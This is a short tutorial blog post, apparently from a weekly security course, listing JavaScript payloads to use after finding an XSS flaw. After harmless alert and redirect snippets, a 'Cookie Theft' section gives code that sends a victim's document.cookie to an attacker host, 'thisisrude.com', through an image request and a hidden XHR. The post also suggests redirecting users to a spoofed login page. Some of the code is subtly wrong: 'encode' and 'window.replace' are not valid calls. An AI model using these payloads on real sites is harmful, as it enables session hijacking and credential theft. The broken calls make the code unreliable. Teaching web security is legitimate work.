---
layout: post
title: JavaScript Payloads
subtitle: Week 18
tags: [XSS, exploit]
---

You've discovered a XSS vulnerability on a page. What next?

*Submit a confidential report.*

Below are a few simple snippets of JavaScript snippets that can be used for evil.

Of course, you need to be familiar with Javascript first...

- <https://www.w3schools.com/js/tryit.asp?filename=tryjs_intro_inner_html>
- <https://developer.mozilla.org/en-US/docs/Web/JavaScript/A_re-introduction_to_JavaScript>

<https://jsfiddle.net/> is a convenient way to execute JavaScript in your web browser.

*****

# Client Payloads

{% highlight javascript linenos %}

// this is a comment. 

/*
 * BTW, there's no difference between useing single quotes (')
 * or double quote (") for strings in Javascript.
 *
 * Semicolons are optional.
 */
// usage: setTimeout(function, milliseconds);
setTimeout(function() {
  alert("Have a wonderful day! ^_^");
}, 5000);

// usage: setInterval(function, milliseconds);
setInterval(function() {
  alert("Don't forget to be awesome.");
}, 5000);

document.getElementsByTagName('h1')[0].innerHTML = 'Just wanted to say hello :)';

window.replace('http://www.staggeringbeauty.com/');

{% endhighlight %}

Some exploits require more setup. For example, you can inject `window.replace` to have users be sent to a spoofed login page. <https://tools.kali.org/information-gathering/set>

# Cookie Theft

Force unknowing users to connect with your unfriendly server. For the code below, we will assume your server is accessible by the domain "thisisrude.com".


{% highlight javascript linenos %}

let yourCookie = encode(document.cookie);

// retrieve an image from the server, but send the victim's cookies as well.
let url = `http://thisisrude.com/picture.jpg?cookie=${yourCookie}`;
document.getElementById('image').src = url;

// AJAX - Unnoticed by the typical user.

// string template https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals
url = `http://thisisrude.com/gimmie?cookie=${yourCookie}`;
let xhr = new XMLHttpRequest();
xhr.open('GET', url, true);
xhr.send();

{% endhighlight %}

# TODO: CSRF and cookie stealing server
